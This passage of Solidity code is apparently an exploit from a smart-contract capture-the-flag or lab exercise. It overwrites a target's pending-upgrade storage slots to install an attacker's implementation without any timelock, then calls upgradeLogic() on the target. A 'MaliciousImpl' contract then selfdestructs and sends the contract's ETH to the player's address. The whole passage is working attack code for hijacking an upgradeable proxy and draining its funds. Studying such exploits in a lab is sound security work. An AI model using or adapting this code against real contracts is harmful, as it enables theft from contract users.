        address attackImpl = deployMaliciousImpl();

        assembly {
            // Set newLogic to our attack contract
            sstore(pendingNewLogicSlot, attackImpl)
            // Set upgradeAfter to current timestamp (0 seconds timelock means immediate)
            sstore(pendingUpgradeAfterSlot, timestamp())
        }

        // Step 3: Execute the upgrade
        (bool success, ) = TARGET.call(abi.encodeWithSignature("upgradeLogic()"));

        // Step 4: Check if we got any ETH
        // The attack contract should have selfdestructed and sent ETH to us
        // Transfer any balance to player
        if (address(this).balance > 0) {
            payable(PLAYER).transfer(address(this).balance);
        }
    }

    // Fallback to receive any ETH sent directly
    receive() external payable {}
}

// Malicious implementation contract
contract MaliciousImpl {
    address constant PLAYER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    fallback() external payable {
        // Selfdestruct and send all ETH to player
        selfdestruct(payable(PLAYER));
    }

